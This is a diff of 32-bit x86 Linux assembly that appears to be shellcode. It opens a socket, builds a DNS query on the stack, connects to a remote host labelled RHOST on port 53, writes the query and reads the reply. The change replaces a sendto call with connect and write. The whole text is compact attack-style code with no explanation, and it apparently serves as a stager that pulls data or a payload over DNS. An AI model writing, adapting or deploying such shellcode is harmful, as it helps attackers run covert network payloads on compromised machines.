@@ -35,13 +35,31 @@ socket:
 	mov  ecx, esp
 	int  0x80
 	xchg eax, edi
-	pop  ebp
 
-sendto:
-	inc  dl
+connect:
+	pop  ebx
+;	push dword 0x03a0f280
+	push dword 0x0100007f ; RHOST
+	mov  dh, 0x35         ; RPORT (53)
+	push dx
+	push bx
+	mov  ecx, esp
+	push byte 0x66
+	pop  eax
+	push eax
+	push ecx
+	push edi
+	mov  ecx, esp
+	inc  ebx
+	int  0x80
+	cdq
+
+write:
+	pop  ebx
+	inc  edx
 	push dx               ; class and type (1, 1)
 	push dx             
-	dec  dl
+	dec  edx
 	push dx
 	push dword 0x6d6f6303 ; \x03com
 	mov  cl, 0x3
@@ -52,28 +70,13 @@ sendto:
 	mov  dh, 0x4
 	push dx               ; q.flags = 0x4 (AA)
 	push si               ; q.id = non-deterministic
-	mov  esi, esp
-;	push dword 0x03a0f280
-	push dword 0x0100007f ; RHOST
-	mov  dh, 0x35         ; RPORT (53)
-	push dx
-	push bp
-	mov  ebx, esp
-	push byte 0x10
-	push ebx
-	cdq
-	push edx
-	push byte 0x19        ; size of the dns request
-	push esi
-	push edi
 	mov  ecx, esp
-	push byte 0xb
-	pop  ebx
-	mov  al, 0x66
+	cdq
+	mov  dl, 0x19
+	mov  al, 0x4
 	int  0x80
 
 read:
-	pop  ebx
 	mov  dh, 0xc
 	mov  al, 0x3
 	int  0x80
